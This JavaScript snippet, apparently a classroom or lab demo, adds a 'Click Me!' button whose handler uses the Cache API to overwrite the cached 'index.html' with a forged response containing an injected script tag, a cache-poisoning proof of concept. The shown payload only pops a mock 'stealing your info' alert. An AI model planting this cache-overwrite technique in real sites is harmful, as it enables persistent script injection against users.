//Wait for the page to load
window.onload = function (e) {
    //Creating a row column and a button 
    var row = document.createElement(`div`);
    row.classList.add('row');
    var col = document.createElement(`div`);
    col.classList.add("col-xs-12");
    var button = document.createElement('button');
    button.classList.add('btn', 'btn-primary');
    button.innerHTML = "Click Me!";
    //Adding a function to the button - this function will insert a malicious response to the cache 
    button.onclick = function () {
        caches.open('prefetch-cache-v1').then(function (cache) {
            cache.put(
                new Request('index.html', { mode: 'no-cors' }),
                new Response('\x3cscript>alert("stilling your info!!! MUHAHAHAHHAHAAA!")\x3c/script>', { headers: { 'content-type': 'text/html' } })
            )
        });
        alert('inject');
    }
    col.appendChild(button);
    row.appendChild(col);

    //appnd the button to the main container
    var container = document.querySelector('.container').appendChild(row);
}